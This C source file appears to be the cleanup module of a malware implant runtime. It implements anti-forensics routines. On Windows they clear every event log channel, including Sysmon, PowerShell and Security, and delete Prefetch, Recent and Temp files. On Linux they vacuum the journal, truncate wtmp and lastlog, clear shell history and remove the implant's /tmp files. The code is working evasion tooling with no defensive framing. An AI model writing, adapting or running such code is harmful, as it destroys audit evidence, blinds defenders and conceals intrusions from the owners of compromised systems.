/*
 * Cleanup: Event Log Clearing + Artifact Wiping
 *
 * jocky_clear_logs()    – clear every Windows event log channel via EvtClearLog;
 *                         on Linux rotates and vacuums the journal.
 * jocky_wipe_artifacts()– delete Prefetch files, Recent files, and Temp contents
 *                         using Win32 file APIs (no child-process spawning).
 */

#include "jocky_rt.h"
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#include <winevt.h>

/* ── Win32 helpers ──────────────────────────────────────────────────── */

/* Delete every file matching pattern (e.g. L"C:\\Windows\\Prefetch\\*.pf").
 * Removes read-only attributes before deletion. */
static void wipe_pattern(const wchar_t* pattern)
{
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    /* Extract the directory prefix from the pattern */
    wchar_t dir[MAX_PATH];
    wcsncpy_s(dir, MAX_PATH, pattern, _TRUNCATE);
    wchar_t* slash = wcsrchr(dir, L'\\');
    if (!slash) { FindClose(h); return; }
    *(slash + 1) = L'\0';

    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        wchar_t full[MAX_PATH];
        _snwprintf_s(full, MAX_PATH, _TRUNCATE, L"%s%s", dir, fd.cFileName);
        SetFileAttributesW(full, FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(full);
    } while (FindNextFileW(h, &fd));

    FindClose(h);
}

/* ── Event log clearing ─────────────────────────────────────────────── */

/*
 * Enumerate all event log channels with the EvtOpenChannelEnum API and call
 * EvtClearLog on each one.  This covers every channel the system knows about
 * including Sysmon (Microsoft-Windows-Sysmon/Operational), PowerShell,
 * WMI-Activity, and all security-relevant channels — not just the classic
 * Application/Security/System trio.
 *
 * Requires: wevtapi.dll (Vista+, always present on Windows 7+).
 * No child processes are spawned.
 */
bool jocky_clear_logs(void)
{
    /* Legacy path: clear the four classic logs using the old API as well,
     * in case EvtClearLog doesn't cover their backing files on the target. */
    static const char* CLASSIC[] = {
        "Application", "Security", "System", "Setup", NULL
    };
    for (int i = 0; CLASSIC[i]; i++) {
        HANDLE hLog = OpenEventLogA(NULL, CLASSIC[i]);
        if (hLog) {
            ClearEventLogA(hLog, NULL);
            CloseEventLog(hLog);
        }
    }

    /* Modern path: enumerate every known channel and clear it */
    EVT_HANDLE hEnum = EvtOpenChannelEnum(NULL, 0);
    if (!hEnum) return false;

    wchar_t channel[1024];
    DWORD used   = 0;
    int   cleared = 0;

    while (EvtNextChannelPath(hEnum, (DWORD)(sizeof(channel) / sizeof(wchar_t)),
                              channel, &used)) {
        EvtClearLog(NULL, channel, NULL, 0);
        cleared++;
    }

    EvtClose(hEnum);
    return cleared > 0;
}

/* ── Artifact wiping ────────────────────────────────────────────────── */

/*
 * Delete Prefetch .pf files, Recent document shortcuts, and the contents of
 * %TEMP%.  Uses Win32 file enumeration — no child processes.
 */
bool jocky_wipe_artifacts(void)
{
    /* Prefetch */
    wchar_t sysroot[MAX_PATH];
    GetWindowsDirectoryW(sysroot, MAX_PATH);

    wchar_t pf_pat[MAX_PATH];
    _snwprintf_s(pf_pat, MAX_PATH, _TRUNCATE, L"%s\\Prefetch\\*.pf", sysroot);
    wipe_pattern(pf_pat);

    /* Recent files */
    wchar_t appdata[MAX_PATH];
    if (GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH)) {
        wchar_t rec_pat[MAX_PATH];
        _snwprintf_s(rec_pat, MAX_PATH, _TRUNCATE,
                     L"%s\\Microsoft\\Windows\\Recent\\*", appdata);
        wipe_pattern(rec_pat);
    }

    /* %TEMP% */
    wchar_t tmp[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tmp)) {
        wchar_t tmp_pat[MAX_PATH];
        _snwprintf_s(tmp_pat, MAX_PATH, _TRUNCATE, L"%s*", tmp);
        wipe_pattern(tmp_pat);
    }

    return true;
}

#else /* Linux */

#include <stdlib.h>

bool jocky_clear_logs(void)
{
    system("journalctl --rotate 2>/dev/null");
    system("journalctl --vacuum-time=1s 2>/dev/null");
    system("truncate -s 0 /var/log/wtmp 2>/dev/null");
    system("truncate -s 0 /var/log/lastlog 2>/dev/null");
    return true;
}

bool jocky_wipe_artifacts(void)
{
    system("history -c 2>/dev/null; history -w 2>/dev/null");
    system("rm -rf /tmp/.jocky* 2>/dev/null");
    return true;
}

#endif /* _WIN32 */
